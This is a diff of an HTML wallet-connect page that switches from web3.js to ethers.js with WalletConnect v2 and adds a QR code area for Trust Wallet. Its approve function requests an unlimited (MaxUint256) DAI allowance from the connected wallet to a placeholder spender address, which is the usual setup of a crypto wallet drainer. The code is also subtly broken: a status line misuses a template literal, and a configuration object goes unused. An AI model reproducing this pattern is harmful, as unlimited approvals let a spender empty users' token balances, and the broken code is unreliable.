@@ -4,74 +4,176 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Connect Wallet with WalletConnect v2</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@2.0.0/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.4.0/dist/umd/index.min.js"></script>
+  <style>
+    #qrCodeContainer {
+      margin: 20px 0;
+      text-align: center;
+    }
+    #qrCode {
+      max-width: 200px;
+      margin: 0 auto;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #3375BB;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #2a5d99;
+    }
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+  </style>
 </head>
 <body>
-  <h1>Coeennect Your Wallet</h1>
+  <h1>Connect Your Wallet</h1>
 
-  <!-- Button to connect wallet -->
   <button id="connectButton">Connect Wallet</button>
   <p id="status">Not connected</p>
+  <div id="qrCodeContainer" style="display:none;">
+    <p>Scan QR code with Trust Wallet</p>
+    <div id="qrCode"></div>
+  </div>
   <button id="approveButton" style="display:none;">Approve Tokens</button>
 
   <script>
-    let web3;
-    let provider;
-    let accounts;
+    // Configuration for WalletConnect
+    const providerOptions = {
+      walletconnect: {
+        package: window.EthereumProvider,
+        options: {
+          projectId: "7dabcdde47b6439403c2ec186b1fedaf", // Register at https://cloud.walletconnect.com/
+          chains: [1], // Ethereum mainnet
+          showQrModal: true,
+          qrModalOptions: {
+            themeVariables: {
+              '--wcm-z-index': '9999'
+            }
+          }
+        }
+      }
+    };
 
-    // Initialize WalletConnect v2
-    const walletConnect = new WalletConnectClient({
-      bridge: "https://bridge.walletconnect.org", // Public WalletConnect bridge
-    });
+    let walletConnectProvider;
+    let web3Provider;
+    let accounts = [];
 
     // Connect wallet function
     async function connectWallet() {
-      if (!walletConnect.connected) {
-        // Create session
-        await walletConnect.createSession();
+      try {
+        document.getElementById("connectButton").disabled = true;
+        document.getElementById("status").innerText = "Connecting...";
+        
+        // Initialize WalletConnect Provider
+        walletConnectProvider = new window.EthereumProvider({
+          projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
+          chains: [1], // Ethereum mainnet
+          showQrModal: true,
+          qrModalOptions: {
+            themeVariables: {
+              '--wcm-z-index': '9999'
+            }
+          }
+        });
 
-        // Open WalletConnect in Trust Wallet or other supported wallets
-        walletConnect.enable(); // This should prompt Trust Wallet to open if it's installed
-      }
-
-      // Listen for account and chain changes
-      walletConnect.on("connect", (error, payload) => {
-        if (error) {
-          console.error(error);
-          return;
+        // Enable session (triggers QR code modal)
+        await walletConnectProvider.enable();
+        
+        // Create ethers.js provider
+        web3Provider = new ethers.providers.Web3Provider(walletConnectProvider);
+        
+        // Get accounts
+        accounts = await web3Provider.listAccounts();
+        
+        if (accounts.length > 0) {
+          document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
+          document.getElementById("connectButton").style.display = "none";
+          document.getElementById("approveButton").style.display = "inline-block";
+          document.getElementById("qrCodeContainer").style.display = "none";
+          
+          // On mobile, this will automatically open Trust Wallet if installed
         }
+        
+        // Subscribe to accounts change
+        walletConnectProvider.on("accountsChanged", (newAccounts) => {
+          accounts = newAccounts;
+          document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
+        });
 
-        // Extract accounts from the payload
-        accounts = payload.params[0].accounts;
-        provider = new Web3(walletConnect); // Initialize Web3 with the WalletConnect provider
-        document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
-        document.getElementById("connectButton").style.display = "none";
-        document.getElementById("approveButton").style.display = "inline-block";
-      });
+        // Subscribe to chain change
+        walletConnectProvider.on("chainChanged", (chainId) => {
+          window.location.reload();
+        });
+
+        // Subscribe to session disconnect
+        walletConnectProvider.on("disconnect", (code, reason) => {
+          console.log(code, reason);
+          resetApp();
+        });
+        
+      } catch (error) {
+        console.error("Error connecting wallet:", error);
+        document.getElementById("status").innerText = "Connection failed";
+        document.getElementById("connectButton").disabled = false;
+      }
     }
 
-    // Function to approve tokens (dummy implementation for now)
-    async function approveTokens() {
-      if (!accounts || !accounts[0]) {
+    // Function to approve tokens (example with ERC20)
+    async function approveTokens() {if (!accounts || !accounts[0]) {
         alert("Wallet is not connected!");
         return;
       }
       
       try {
-        // Example contract interaction (replace with actual contract details)
-        const contractAddress = "0xYourContractAddress";
-        const spenderAddress = "0xSpenderAddress";
-        const amount = web3.utils.toWei("100", "ether"); // Example amount to approve
-
-        console.log(`Approving ${amount} tokens to ${spenderAddress}`);
-
-        // Normally: contract.methods.approve(spenderAddress, amount).send({ from: accounts[0] });
-
-        alert("Tokens approved!");
+        document.getElementById("approveButton").disabled = true;
+        document.getElementById("status").innerText = "Approving tokens...";
+        
+        // Example ERC20 token contract (DAI)
+        const tokenAddress = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
+        const spenderAddress = "0xYourSpenderAddress"; // Replace with actual spender
+        
+        // ERC20 ABI (simplified for approve function)
+        const erc20Abi = [
+          "function approve(address spender, uint256 amount) public returns (bool)"
+        ];
+        
+        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, web3Provider.getSigner());
+        
+        // Approve max uint256 amount
+        const amount = ethers.constants.MaxUint256;
+        
+        const tx = await tokenContract.approve(spenderAddress, amount);
+        
+        document.getElementById("status").innerText = Transaction `sent: ${tx.hash}`;
+        
+        // Wait for transaction to be mined
+        await tx.wait();
+        
+        document.getElementById("status").innerText = "Tokens approved successfully!";
+        document.getElementById("approveButton").disabled = false;
+        
       } catch (err) {
         console.error("Error approving tokens:", err);
+        document.getElementById("status").innerText = `Error: ${err.message}`;
+        document.getElementById("approveButton").disabled = false;
       }
+    }
+
+    function resetApp() {
+      accounts = [];
+      document.getElementById("status").innerText = "Disconnected";
+      document.getElementById("connectButton").style.display = "inline-block";
+      document.getElementById("connectButton").disabled = false;
+      document.getElementById("approveButton").style.display = "none";
+      document.getElementById("qrCodeContainer").style.display = "none";
     }
 
     // Button event listeners
